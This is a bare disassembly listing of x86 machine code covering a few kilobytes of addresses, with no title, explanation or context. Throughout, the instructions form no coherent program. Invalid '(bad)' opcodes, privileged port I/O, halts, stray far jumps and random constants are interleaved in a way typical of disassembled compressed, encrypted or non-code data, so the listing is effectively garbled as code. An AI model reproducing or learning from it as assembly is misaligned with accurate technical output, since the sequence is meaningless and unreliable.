  41a7b0:	mov    cl,0x98
  41a7b2:	clc    
  41a7b3:	hlt    
  41a7b4:	fld    st(5)
  41a7b6:	mov    ebp,0xb535bffc
  41a7bb:	xor    DWORD PTR [edi],esi
  41a7bd:	scas   eax,DWORD PTR es:[edi]
  41a7be:	adc    dl,BYTE PTR [edi-0x467d9e22]
  41a7c4:	dec    eax
  41a7c5:	retf   
  41a7c6:	jmp    0x7801:0x6c6ae494
  41a7cd:	jae    0x41a7d5
  41a7cf:	sub    edi,DWORD PTR [ebx+ebx*4]
  41a7d2:	retf   
  41a7d3:	xor    edx,DWORD PTR [esi+0x58]
  41a7d6:	js     0x41a844
  41a7d8:	xor    DWORD PTR [ecx],ebp
  41a7da:	pop    es
  41a7db:	push   esi
  41a7dc:	loope  0x41a790
  41a7de:	and    cl,ch
  41a7e0:	ins    DWORD PTR es:[edi],dx
  41a7e1:	ja     0x41a818
  41a7e3:	lahf   
  41a7e4:	shl    DWORD PTR [ecx],0xd6
  41a7e7:	pop    ecx
  41a7e8:	sbb    al,0xee
  41a7ea:	or     eax,0x46038c76
  41a7ef:	aaa    
  41a7f0:	mov    ebp,0xfba17db
  41a7f5:	loop   0x41a838
  41a7f7:	stos   DWORD PTR es:[edi],eax
  41a7f8:	repz add DWORD PTR [edi+0x1086bc7e],ebx
  41a7ff:	cmp    DWORD PTR [ebx-0x5ccf921c],edx
  41a805:	ins    DWORD PTR es:[edi],dx
  41a806:	pop    ss
  41a807:	out    dx,eax
  41a808:	or     al,0xf9
  41a80a:	fadd   QWORD PTR [esi]
  41a80c:	mov    ebx,0xa13e4f89
  41a811:	pop    ecx
  41a812:	ins    DWORD PTR es:[edi],dx
  41a813:	xchg   DWORD PTR [edx],edx
  41a815:	inc    BYTE PTR [eax+0x21]
  41a818:	push   edx
  41a819:	push   ecx
  41a81a:	sqrtps xmm1,XMMWORD PTR gs:[edx+ebx*2-0x566dc7f2]
  41a823:	adc    DWORD PTR [ebx+0x11e6baa6],ebx
  41a829:	iret   
  41a82a:	popf   
  41a82b:	loope  0x41a816
  41a82d:	rol    DWORD PTR [edi],0xbf
  41a830:	dec    esi
  41a831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a832:	gs in  al,dx
  41a834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a835:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a836:	sub    al,0x28
  41a838:	mov    WORD PTR [edi-0x1254373e],?
  41a83e:	adc    al,0x9e
  41a840:	mov    bh,BYTE PTR [ecx-0x2102cb14]
  41a846:	and    ecx,0x2a
  41a849:	in     al,dx
  41a84a:	jo     0x41a814
  41a84c:	enter  0x9529,0x58
  41a850:	xchg   esp,eax
  41a851:	lds    esp,FWORD PTR [ebx]
  41a853:	push   ebp
  41a854:	adc    BYTE PTR ds:0x2e6d934f,dl
  41a85a:	ins    BYTE PTR es:[edi],dx
  41a85b:	ja     0x41a827
  41a85d:	mov    DWORD PTR [eax+edi*2-0x13bcf2c1],edx
  41a864:	stos   DWORD PTR es:[edi],eax
  41a865:	mov    eax,0x9bc16bfb
  41a86a:	rcl    DWORD PTR [ecx+0x60bca5a0],1
  41a870:	mov    ch,0xfd
  41a872:	jg     0x41a82d
  41a874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a875:	shl    BYTE PTR [edx-0x1c245d6a],1
  41a87b:	test   BYTE PTR [ebp+esi*1-0x10],bl
  41a87f:	add    al,BYTE PTR [edi+0x49]
  41a882:	aad    0x2f
  41a884:	push   eax
  41a885:	dec    edi
  41a886:	js     0x41a82c
  41a888:	mov    eax,ds:0x7d3815e0
  41a88d:	mov    ebp,0x5031a75f
  41a892:	outs   dx,DWORD PTR ds:[esi]
  41a893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a894:	and    al,0xda
  41a896:	(bad)  
  41a897:	fbstp  TBYTE PTR [edi+0x1b1b4b72]
  41a89d:	icebp  
  41a89e:	dec    esi
  41a89f:	and    eax,DWORD PTR [edi]
  41a8a1:	int    0xbb
  41a8a3:	popf   
  41a8a4:	mov    es,WORD PTR [eax+0x6d]
  41a8a7:	cld    
  41a8a8:	(bad)  
  41a8a9:	pop    ebx
  41a8aa:	xor    bl,BYTE PTR [ecx+0x3e73dcaf]
  41a8b0:	(bad)  
  41a8b3:	dec    edx
  41a8b4:	jb     0x41a934
  41a8b6:	cmp    eax,0xb6ff00da
  41a8bb:	inc    eax
  41a8bc:	mov    BYTE PTR [edi+0x7dae296b],ah
  41a8c2:	cmp    al,al
  41a8c4:	das    
  41a8c5:	and    DWORD PTR [ebx+0x3bda1446],esi
  41a8cb:	loope  0x41a916
  41a8cd:	loop   0x41a90f
  41a8cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8d0:	not    ebx
  41a8d2:	(bad)  
  41a8d3:	jo     0x41a90e
  41a8d5:	and    al,ah
  41a8d7:	cli    
  41a8d8:	icebp  
  41a8d9:	test   BYTE PTR [ecx+0x4d],dl
  41a8dc:	int    0x80
  41a8de:	ja     0x41a8f3
  41a8e0:	lock jp 0x41a909
  41a8e3:	leave  
  41a8e4:	fisubr WORD PTR [esi-0x369233b0]
  41a8ea:	inc    edi
  41a8eb:	push   ss
  41a8ec:	loopne 0x41a953
  41a8ee:	pop    esi
  41a8ef:	jmp    0x41a96c
  41a8f1:	mov    edi,edi
  41a8f3:	push   esi
  41a8f4:	scas   al,BYTE PTR es:[edi]
  41a8f5:	hlt    
  41a8f6:	js     0x41a935
  41a8f8:	hlt    
  41a8f9:	dec    eax
  41a8fa:	outs   dx,DWORD PTR ds:[esi]
  41a8fb:	out    0xd2,eax
  41a8fd:	jae    0x41a94c
  41a8ff:	ins    BYTE PTR es:[edi],dx
  41a900:	(bad)  
  41a901:	sbb    DWORD PTR [edi+0x567da40c],ebx
  41a907:	and    DWORD PTR [edi-0x3a6e6485],0x19710230
  41a911:	push   ss
  41a912:	es repnz cmc 
  41a915:	dec    edi
  41a916:	mov    eax,ds:0x59841daf
  41a91b:	nop
  41a91c:	dec    edi
  41a91d:	ja     0x41a8b4
  41a91f:	lock cdq 
  41a921:	mov    ds:0x5e735ec9,eax
  41a926:	sbb    BYTE PTR [ebp+esi*1-0x10d5210e],bl
  41a92d:	or     al,BYTE PTR [ecx]
  41a92f:	or     al,al
  41a931:	(bad)  
  41a932:	loopne 0x41a943
  41a934:	and    edx,DWORD PTR [edi+0x638edf12]
  41a93a:	rcr    DWORD PTR [ecx+0x5936b0ab],0x88
  41a941:	sub    BYTE PTR [esi-0x8576d22],0xc8
  41a948:	jns    0x41a983
  41a94a:	mov    eax,0x8dab224a
  41a94f:	pop    ebp
  41a950:	aaa    
  41a951:	in     eax,0x69
  41a953:	mov    edi,0xe86bfc0b
  41a958:	push   edx
  41a959:	mov    ch,0x3c
  41a95b:	loop   0x41a929
  41a95d:	push   ecx
  41a95e:	pop    ebx
  41a95f:	push   edx
  41a960:	js     0x41a979
  41a962:	hlt    
  41a963:	mov    ebx,0xa2ea4ce8
  41a968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a969:	mov    BYTE PTR [eax+0x39],bl
  41a96c:	jo     0x41a9e7
  41a96e:	push   ss
  41a96f:	push   ecx
  41a970:	mov    ebp,0x39b7fedd
  41a975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a976:	std    
  41a977:	daa    
  41a978:	test   dh,bh
  41a97a:	jmp    0x3265:0xb7ede8b
  41a981:	lea    eax,[ebp+0x3c44d70c]
  41a987:	inc    esi
  41a988:	les    edi,FWORD PTR [ecx-0x13]
  41a98b:	jge    0x41a97e
  41a98d:	and    BYTE PTR [ebx-0xc4999c1],ah
  41a993:	sar    DWORD PTR [edx+eiz*2-0x74afb860],cl
  41a99a:	sbb    BYTE PTR [esi+0x59750b2a],bh
  41a9a0:	lods   al,BYTE PTR ds:[esi]
  41a9a1:	jle    0x41aa1a
  41a9a3:	add    DWORD PTR [esi],esp
  41a9a5:	pop    ebp
  41a9a6:	and    esi,DWORD PTR [edi]
  41a9a8:	sbb    al,0x2e
  41a9aa:	jp     0x41a9fa
  41a9ac:	stc    
  41a9ad:	push   eax
  41a9ae:	inc    ecx
  41a9af:	test   eax,0xa5d7656d
  41a9b4:	iret   
  41a9b5:	sbb    BYTE PTR [ebx-0x64ac2ed4],0x3f
  41a9bc:	mov    edx,0xf60b15d3
  41a9c1:	frstor [edx+ebp*1]
  41a9c4:	xchg   esi,eax
  41a9c5:	sub    al,0x6
  41a9c7:	jl     0x41a9eb
  41a9c9:	inc    ebx
  41a9ca:	xor    bl,cl
  41a9cc:	add    esp,DWORD PTR [ecx+0xa329678]
  41a9d2:	pusha  
  41a9d3:	jne    0x41a9cb
  41a9d5:	ds jle 0x41a9d0
  41a9d8:	es inc esi
  41a9da:	sbb    ebp,ebp
  41a9dc:	jnp    0x41a961
  41a9de:	and    ecx,esi
  41a9e0:	ss test ax,0x115a
  41a9e5:	pop    ss
  41a9e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9e7:	test   ch,0xbc
  41a9ea:	rcr    DWORD PTR [edi],1
  41a9ec:	out    dx,al
  41a9ed:	int3   
  41a9ee:	leave  
  41a9ef:	sub    BYTE PTR [eax],0xa9
  41a9f2:	cmp    eax,0xbed8b455
  41a9f7:	xor    BYTE PTR [esi],0x7f
  41a9fa:	rol    BYTE PTR es:[edi+0xddefbef],1
  41aa01:	push   edi
  41aa02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa03:	sbb    eax,0xd6290b41
  41aa08:	aad    0x93
  41aa0a:	push   edx
  41aa0b:	fsubr  st,st(1)
  41aa0d:	xchg   esi,eax
  41aa0e:	loope  0x41a9a6
  41aa10:	jl     0x41aa86
  41aa12:	mov    dl,0x86
  41aa14:	xor    al,0x56
  41aa16:	stc    
  41aa17:	jae    0x41a9c9
  41aa19:	sbb    esi,DWORD PTR ds:0xc3f6d69d
  41aa1f:	bound  ebx,QWORD PTR [eax+0x11]
  41aa22:	retf   0x79fb
  41aa25:	cmp    ah,BYTE PTR [edx]
  41aa27:	mov    edx,0x6b246b37
  41aa2c:	mov    BYTE PTR [eax-0x249d97be],cl
  41aa32:	inc    ebp
  41aa33:	jae    0x41aa8e
  41aa35:	xchg   esi,eax
  41aa36:	(bad)  [eax-0x20]
  41aa39:	xchg   ecx,eax
  41aa3a:	stos   BYTE PTR es:[edi],al
  41aa3b:	xor    ecx,ebx
  41aa3d:	iret   
  41aa3e:	xor    DWORD PTR [eax-0x17de5c0b],esp
  41aa44:	out    dx,al
  41aa45:	jnp    0x41a9d7
  41aa47:	push   esi
  41aa48:	push   esi
  41aa49:	retf   
  41aa4a:	pop    esp
  41aa4b:	pusha  
  41aa4c:	icebp  
  41aa4d:	pushf  
  41aa4e:	mov    BYTE PTR [ebp-0x6a],ch
  41aa51:	pushf  
  41aa52:	mov    dl,0x4a
  41aa54:	adc    al,0x70
  41aa56:	pop    ds
  41aa57:	fldcw  WORD PTR [ebx-0x38cdffbf]
  41aa5d:	aaa    
  41aa5e:	pop    esi
  41aa5f:	jecxz  0x41aa5e
  41aa61:	loope  0x41aabf
  41aa63:	mov    ebx,0xbd00ab7d
  41aa68:	call   0x2feabf7f
  41aa6d:	icebp  
  41aa6e:	xor    dh,dh
  41aa70:	or     ecx,DWORD PTR [ebx-0x650ca235]
  41aa76:	pop    ds
  41aa77:	test   BYTE PTR [ebx+ebp*4+0x3b1bd62],ah
  41aa7e:	inc    edi
  41aa7f:	scas   eax,DWORD PTR es:[edi]
  41aa80:	mov    BYTE PTR ds:0xc5850fda,al
  41aa86:	or     al,0x74
  41aa88:	mov    es,WORD PTR [edx-0x1d72ea87]
  41aa8e:	sub    eax,0x99ff4a3
  41aa93:	test   dl,bh
  41aa95:	pusha  
  41aa96:	aas    
  41aa97:	pop    es
  41aa98:	mov    esi,0xcc3a77c0
  41aa9d:	rol    BYTE PTR [edx+0x7ce8af4a],cl
  41aaa3:	in     eax,0x48
  41aaa5:	xchg   DWORD PTR [eax+edi*1],esp
  41aaa8:	push   edi
  41aaa9:	or     DWORD PTR [eax+0x68],0xd93eab5c
  41aab0:	dec    edx
  41aab1:	mov    bh,0xf2
  41aab3:	mov    bl,0x80
  41aab5:	inc    eax
  41aab6:	popa   
  41aab7:	in     al,0x52
  41aab9:	push   ds
  41aaba:	xor    al,0x60
  41aabc:	xor    dh,BYTE PTR [eax-0x4699d18c]
  41aac2:	es inc edi
  41aac4:	add    eax,0xfef582de
  41aac9:	dec    esi
  41aaca:	and    esi,edx
  41aacc:	adc    DWORD PTR [edi-0x55],ebp
  41aacf:	ins    BYTE PTR es:[edi],dx
  41aad0:	or     eax,0x93cb950
  41aad5:	fdivp  st(4),st
  41aad7:	or     al,0x94
  41aad9:	mov    eax,ds:0xc6e5bbf7
  41aade:	addr16 inc edi
  41aae0:	jo     0x41ab0a
  41aae2:	xor    esi,DWORD PTR [ebx-0x40c220d9]
  41aae8:	leave  
  41aae9:	add    BYTE PTR [edx],0x7f
  41aaec:	jbe    0x41ab62
  41aaee:	iret   
  41aaef:	jnp    0x41aae9
  41aaf1:	scas   eax,DWORD PTR es:[edi]
  41aaf2:	and    eax,0x3140283
  41aaf7:	bound  eax,QWORD PTR ds:0x6983f897
  41aafd:	pop    ds
  41aafe:	shr    DWORD PTR [edi+0x3739cd45],cl
  41ab04:	jnp    0x41aabc
  41ab06:	les    ecx,FWORD PTR [esi-0x4f]
  41ab09:	pop    ecx
  41ab0a:	retf   
  41ab0b:	dec    esp
  41ab0c:	pusha  
  41ab0d:	fcomp  QWORD PTR [edx-0x66]
  41ab10:	sbb    cl,BYTE PTR [eax-0x73]
  41ab13:	add    BYTE PTR ds:0x9fd69714,bl
  41ab19:	push   edi
  41ab1a:	jns    0x41ab95
  41ab1c:	clc    
  41ab1d:	xchg   ebx,eax
  41ab1e:	push   edi
  41ab1f:	dec    esi
  41ab20:	sub    BYTE PTR [esi-0x15],0xcc
  41ab24:	inc    esp
  41ab25:	inc    ebx
  41ab26:	mov    esi,0x952c155a
  41ab2b:	stos   DWORD PTR es:[edi],eax
  41ab2c:	mov    bl,dl
  41ab2e:	iret   
  41ab2f:	fsubp  st(4),st
  41ab31:	shl    BYTE PTR [esi+0x6e],cl
  41ab34:	sub    eax,0x2d08cfb4
  41ab39:	mov    ?,WORD PTR [ecx+0x429f98f1]
  41ab3f:	mov    dh,0xd7
  41ab41:	adc    esi,edi
  41ab43:	sub    edx,esp
  41ab45:	adc    ebp,edx
  41ab47:	xchg   edx,eax
  41ab48:	xchg   ecx,eax
  41ab49:	push   ss
  41ab4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab4b:	pusha  
  41ab4c:	cmp    DWORD PTR [esi+0x34],esi
  41ab4f:	jnp    0x41ab98
  41ab51:	xor    eax,0xa9a67012
  41ab56:	inc    edx
  41ab57:	frstor [ecx]
  41ab59:	sbb    BYTE PTR [ebp+0x5d],ch
  41ab5c:	mov    ebp,0xa95ff753
  41ab61:	in     al,dx
  41ab62:	out    dx,eax
  41ab63:	adc    BYTE PTR [eax-0x3e],al
  41ab66:	push   ss
  41ab67:	lock ss call 0x8be7fa17
  41ab6e:	add    BYTE PTR [ebx-0x2620db90],0x80
  41ab75:	shl    BYTE PTR [edx+0xa32f674],cl
  41ab7b:	bound  eax,QWORD PTR [eax+0x6c3387c1]
  41ab81:	pop    DWORD PTR cs:[ebx-0x5]
  41ab85:	pop    esp
  41ab86:	adc    al,0x1e
  41ab88:	fist   DWORD PTR [ecx+edi*1]
  41ab8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab8c:	fsub   DWORD PTR [ebx-0x17]
  41ab8f:	aam    0x55
  41ab91:	add    ecx,ecx
  41ab93:	arpl   bx,sp
  41ab95:	mov    ebp,0x94e0fde
  41ab9a:	pop    ss
  41ab9b:	pop    edx
  41ab9c:	enter  0xa23b,0xb9
  41aba0:	ss je  0x41ab76
  41aba3:	cmc    
  41aba4:	fdivr  QWORD PTR [edx+0x50074ef7]
  41abaa:	js     0x41ac0a
  41abac:	test   al,0x7a
  41abae:	add    eax,ebp
  41abb0:	dec    eax
  41abb1:	fbld   TBYTE PTR [edi-0x671c29e7]
  41abb7:	adc    BYTE PTR [edx-0x21],0x85
  41abbb:	push   edi
  41abbc:	pushf  
  41abbd:	daa    
  41abbe:	xor    BYTE PTR [ecx+0x717e5ef4],ch
  41abc4:	fs push ebx
  41abc6:	daa    
  41abc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abc8:	js     0x41abfe
  41abca:	loopne 0x41abb3
  41abcc:	and    edx,ebp
  41abce:	es push edi
  41abd0:	pop    esp
  41abd1:	jo     0x41abd6
  41abd3:	push   eax
  41abd4:	xor    DWORD PTR [esi-0x28],eax
  41abd7:	call   0x4cb4:0x58ea97c5
  41abde:	(bad)  
  41abdf:	or     ah,0x70
  41abe2:	xchg   ecx,eax
  41abe3:	adc    al,0x72
  41abe5:	pop    edx
  41abe6:	cwde   
  41abe7:	icebp  
  41abe8:	fild   QWORD PTR [ecx]
  41abea:	ins    BYTE PTR es:[edi],dx
  41abeb:	push   0x36
  41abed:	gs mov edx,0x73296c60
  41abf3:	aad    0x18
  41abf5:	jns    0x41ac74
  41abf7:	jecxz  0x41abf6
  41abf9:	jne    0x41ab99
  41abfb:	cli    
  41abfc:	test   DWORD PTR [ebx+0x3a2d9631],ecx
  41ac02:	fsubr  QWORD PTR [edi]
  41ac04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac05:	sbb    DWORD PTR [esi-0x3f57329f],esp
  41ac0b:	and    BYTE PTR [edx],al
  41ac0d:	jg     0x41abc5
  41ac0f:	fisub  WORD PTR [ebp-0x4d]
  41ac12:	jb     0x41abc6
  41ac14:	jnp    0x41ac32
  41ac16:	call   DWORD PTR [edx-0x59411030]
  41ac1c:	pop    ecx
  41ac1d:	mov    al,BYTE PTR [eax-0x3f]
  41ac20:	xchg   edx,eax
  41ac21:	(bad)  
  41ac22:	and    al,0xa9
  41ac24:	mov    al,0x4c
  41ac26:	daa    
  41ac27:	bound  esp,QWORD PTR [ebx+edi*8+0x3c2944bb]
  41ac2e:	xchg   DWORD PTR [eax-0x2f],edx
  41ac31:	ss mov dh,0x6b
  41ac34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac35:	ficom  WORD PTR [ebp+0x72]
  41ac38:	iret   
  41ac39:	pop    edi
  41ac3a:	jp     0x41abf5
  41ac3c:	cwde   
  41ac3d:	retf   
  41ac3e:	xlat   BYTE PTR ds:[ebx]
  41ac3f:	inc    ebx
  41ac40:	dec    eax
  41ac41:	int    0xbf
  41ac43:	inc    edi
  41ac44:	cmp    dh,BYTE PTR [ebx+0x6b6a12e0]
  41ac4a:	mov    bh,0xb0
  41ac4c:	outs   dx,DWORD PTR ds:[esi]
  41ac4d:	stc    
  41ac4e:	pop    esi
  41ac4f:	sub    eax,0x372dc1e0
  41ac54:	jmp    0x60e771b0
  41ac59:	xor    ah,BYTE PTR [esi]
  41ac5b:	aam    0xc2
  41ac5d:	fnsave [edx]
  41ac5f:	adc    BYTE PTR [eax-0x4875c0f8],bh
  41ac65:	push   edi
  41ac66:	sub    eax,0x53a0c405
  41ac6b:	not    DWORD PTR [ecx+ebp*2+0x1b9bc705]
  41ac72:	push   esi
  41ac73:	gs push eax
  41ac75:	mov    al,0x74
  41ac77:	in     al,dx
  41ac78:	out    dx,eax
  41ac79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac7a:	jl     0x41acfa
  41ac7c:	or     esp,DWORD PTR [ebp+0x38]
  41ac7f:	push   ebp
  41ac80:	pop    esi
  41ac81:	add    BYTE PTR [edi+0x741febcc],al
  41ac87:	push   esi
  41ac88:	loope  0x41acd1
  41ac8a:	push   cs
  41ac8b:	popf   
  41ac8c:	repz sub bh,BYTE PTR [esi+0x19b58a9d]
  41ac93:	imul   ebp,DWORD PTR [ebp-0x1e],0x7d
  41ac97:	sbb    ecx,DWORD PTR [esi-0x672a119c]
  41ac9d:	stc    
  41ac9e:	les    edx,FWORD PTR [esi]
  41aca0:	push   edx
  41aca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aca2:	repz retf 
  41aca4:	cli    
  41aca5:	aas    
  41aca6:	mov    dl,0x79
  41aca8:	push   cs
  41aca9:	retf   
  41acaa:	mov    ah,0xde
  41acac:	es aas 
  41acae:	and    DWORD PTR [edi-0x1d6477e1],ebx
  41acb4:	popa   
  41acb5:	cmp    esi,eax
  41acb7:	xor    eax,0x9ddad16e
  41acbc:	pop    ebp
  41acbd:	mov    al,0x7d
  41acbf:	stos   DWORD PTR es:[edi],eax
  41acc0:	retf   0xba1d
  41acc3:	cmp    eax,ebp
  41acc5:	adc    al,0xb7
  41acc7:	in     eax,dx
  41acc8:	scas   eax,DWORD PTR es:[edi]
  41acc9:	mov    ah,0x2
  41accb:	pop    esp
  41accc:	popa   
  41accd:	ror    BYTE PTR [eax+edx*4],1
  41acd0:	jns    0x41ac97
  41acd2:	adc    esp,DWORD PTR [ebx+0x7b153d3c]
  41acd8:	imul   esp,DWORD PTR [ebp-0xe],0x83028465
  41acdf:	mov    cl,0xf1
  41ace1:	daa    
  41ace2:	repz and eax,0xc97e5ca8
  41ace8:	dec    edx
  41ace9:	inc    eax
  41acea:	pop    ds
  41aceb:	mov    esi,DWORD PTR [edx+0x1b]
  41acee:	add    edi,DWORD PTR [ecx+0xee80986]
  41acf4:	fsubp  st(7),st
  41acf6:	push   ecx
  41acf7:	push   edx
  41acf8:	fistp  QWORD PTR [esi+0x2601eca9]
  41acfe:	(bad)  
  41acff:	jge    0x41acf1
  41ad01:	mov    esi,0xa7199543
  41ad06:	jb     0x41acd9
  41ad08:	mov    ebx,DWORD PTR [esi+0x7c]
  41ad0b:	jae    0x41acef
  41ad0d:	jle    0x41ad8d
  41ad0f:	ins    BYTE PTR es:[edi],dx
  41ad10:	imul   edi,edi,0x5f
  41ad13:	cmp    cl,BYTE PTR [edi+eax*1-0x7e10980e]
  41ad1a:	(bad)  
  41ad1b:	mov    ebp,0xeefd9387
  41ad20:	xchg   edi,eax
  41ad21:	jns    0x41acaf
  41ad23:	jnp    0x41ad3e
  41ad25:	imul   edx,DWORD PTR [eax+0x75],0xa7de13c4
  41ad2c:	mov    bh,ah
  41ad2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad2f:	sub    ebx,eax
  41ad31:	sar    BYTE PTR [ebp+0x57],0xe1
  41ad35:	icebp  
  41ad36:	inc    esp
  41ad37:	mov    dh,0xb
  41ad39:	sbb    al,0x24
  41ad3b:	xchg   edi,eax
  41ad3c:	icebp  
  41ad3d:	aaa    
  41ad3e:	push   esp
  41ad3f:	ror    BYTE PTR [ebx+0x70],1
  41ad42:	jns    0x41acdc
  41ad44:	sbb    BYTE PTR [esi],bl
  41ad46:	test   eax,0xd9385a57
  41ad4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad4c:	lahf   
  41ad4d:	add    eax,DWORD PTR [edi]
  41ad4f:	ds in  eax,dx
  41ad51:	mov    edi,esp
  41ad53:	jg     0x41ad2a
  41ad55:	inc    eax
  41ad56:	into   
  41ad57:	fs jno 0x41ad77
  41ad5a:	les    esi,FWORD PTR ds:0x6683c12
  41ad60:	fld    DWORD PTR [ecx+0x53]
  41ad63:	mov    ebx,0x5c425125
  41ad68:	xor    bl,BYTE PTR [edi+0x3f]
  41ad6b:	push   ebp
  41ad6c:	sub    BYTE PTR ds:0xb01e5bb0,0x92
  41ad73:	or     BYTE PTR [edx+0x1b23ee1d],bl
  41ad79:	adc    dh,cl
  41ad7b:	(bad)  
  41ad7c:	stos   DWORD PTR es:[edi],eax
  41ad7d:	cdq    
  41ad7e:	and    ebx,edi
  41ad80:	push   edx
  41ad81:	mov    ch,0xf4
  41ad83:	std    
  41ad84:	(bad)  
  41ad85:	xchg   ecx,eax
  41ad86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad87:	mov    esi,0xb153b236
  41ad8c:	ins    DWORD PTR es:[edi],dx
  41ad8d:	popa   
  41ad8e:	jg     0x41ad6b
  41ad90:	out    0x2e,eax
  41ad92:	sub    eax,DWORD PTR [edi+0x47b6fcb]
  41ad98:	cmp    eax,0x95a44f1a
  41ad9d:	xor    edi,DWORD PTR [ebp-0x70]
  41ada0:	mov    esp,?
  41ada2:	(bad)  
  41ada3:	and    ah,BYTE PTR [ecx-0x27]
  41ada6:	sub    al,BYTE PTR [ebx-0x46]
  41ada9:	nop
  41adaa:	ficomp DWORD PTR [edx-0x63]
  41adad:	push   0x240a8d9b
  41adb2:	es jbe 0x41ae02
  41adb5:	scas   eax,DWORD PTR es:[edi]
  41adb6:	jb     0x41ada7
  41adb8:	add    bl,cl
  41adba:	shl    BYTE PTR [edx+0xf],0x28
  41adbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adbf:	sub    BYTE PTR [ebp+0x7ed490c6],dl
  41adc5:	es and edi,0x1242fcbe
  41adcc:	jo     0x41ae10
  41adce:	jno    0x41adb2
  41add0:	push   eax
  41add1:	pop    esp
  41add2:	aaa    
  41add3:	add    al,0xa9
  41add5:	pmaxsw mm2,mm2
  41add8:	jo     0x41ae1a
  41adda:	imul   ebp,DWORD PTR [edx+0x1],0xffffffc7
  41adde:	or     eax,0xd6728e7c
  41ade3:	repnz rol BYTE PTR [edx+0x7],0x49
  41ade8:	sub    dl,ah
  41adea:	fmul   st(6),st
  41adec:	das    
  41aded:	cmp    dh,0xb4
  41adf0:	sar    dh,cl
  41adf2:	sub    DWORD PTR [esi+esi*4],edi
  41adf5:	gs inc esp
  41adf7:	dec    ebp
  41adf8:	add    eax,0x432b035d
  41adfd:	imul   eax,DWORD PTR [ebx],0x2b64e251
  41ae03:	inc    ebx
  41ae04:	push   DWORD PTR [esi-0x29dd4773]
  41ae0a:	ss std 
  41ae0c:	xchg   esi,eax
  41ae0d:	adc    eax,0x8bdcdb59
  41ae12:	jae    0x41ae51
  41ae14:	sti    
  41ae15:	mov    cs,WORD PTR [esi-0x2df55307]
  41ae1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae1c:	repz out 0xb6,al
  41ae1f:	push   0x5c
  41ae21:	out    dx,al
  41ae22:	sub    al,0x5a
  41ae24:	sbb    DWORD PTR [edi],ebx
  41ae26:	fbld   TBYTE PTR [esi+0x4495483c]
  41ae2c:	cmp    ebp,DWORD PTR [ebx+0x33]
  41ae2f:	jmp    0x1d5e:0xaa5a18e8
  41ae36:	(bad)  
  41ae37:	stos   BYTE PTR es:[edi],al
  41ae38:	stos   BYTE PTR es:[edi],al
  41ae39:	mov    al,0x3e
  41ae3b:	jnp    0x41add5
  41ae3d:	inc    ebp
  41ae3e:	rol    DWORD PTR [esi+0x22],1
  41ae41:	push   eax
  41ae42:	dec    ecx
  41ae43:	mov    dh,0x28
  41ae45:	dec    edi
  41ae46:	mov    ch,BYTE PTR [ebx+0x1a]
  41ae49:	lea    ecx,[edx-0x5f]
  41ae4c:	pop    ecx
  41ae4d:	adc    BYTE PTR [esp+ebx*4-0x49],ah
  41ae51:	add    bh,bh
  41ae53:	stos   BYTE PTR es:[edi],al
  41ae54:	(bad)  
  41ae55:	fisubr DWORD PTR [esi-0x12ca7c00]
  41ae5b:	push   esi
  41ae5c:	mov    al,ds:0xd12a7732
  41ae61:	mov    edi,0xfe13b740
  41ae66:	push   edi
  41ae67:	xor    al,0x60
  41ae69:	sbb    eax,0x517bea81
  41ae6e:	outs   dx,BYTE PTR ds:[esi]
  41ae6f:	and    BYTE PTR [ecx+0x14e79087],bl
  41ae75:	iret   
  41ae76:	fucomp st(7)
  41ae78:	test   eax,0xbcc92376
  41ae7d:	inc    eax
  41ae7e:	cwde   
  41ae7f:	fisttp QWORD PTR [ebp+0x48]
  41ae82:	dec    edi
  41ae83:	adc    eax,0x1a0bc996
  41ae88:	xlat   BYTE PTR ds:[ebx]
  41ae89:	or     dh,ch
  41ae8b:	push   cs
  41ae8c:	dec    ecx
  41ae8d:	stos   DWORD PTR es:[edi],eax
  41ae8e:	push   eax
  41ae8f:	pop    ebx
  41ae90:	into   
  41ae91:	add    DWORD PTR [ebx+0x19],esi
  41ae94:	or     dl,dh
  41ae96:	push   ebx
  41ae97:	scas   eax,DWORD PTR es:[edi]
  41ae98:	mov    edx,0xfe11e555
  41ae9d:	xchg   edx,eax
  41ae9e:	(bad)  
  41ae9f:	push   ebx
  41aea0:	into   
  41aea1:	scas   eax,DWORD PTR es:[edi]
  41aea2:	pop    ss
  41aea3:	pop    eax
  41aea4:	(bad)
  41aea9:	or     ecx,DWORD PTR [edx+esi*4-0x476b78f4]
  41aeb0:	sub    eax,0xe72b4f09
  41aeb5:	rol    DWORD PTR [ecx],0xd7
  41aeb8:	adc    cl,BYTE PTR [esi-0x20041f71]
  41aebe:	push   eax
  41aebf:	stc    
  41aec0:	fs in  al,0x99
  41aec3:	inc    edi
  41aec4:	mov    edi,0x5a4ed4c8
  41aec9:	pop    es
  41aeca:	jnp    0x41aeed
  41aecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aecd:	push   cs
  41aece:	sar    BYTE PTR [ebp+0x600f22c2],0x9d
  41aed5:	sub    edx,DWORD PTR [esi+0x7a28d6d7]
  41aedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aedc:	(bad)  
  41aede:	out    0x2f,eax
  41aee0:	mov    esp,0x1c4acb2e
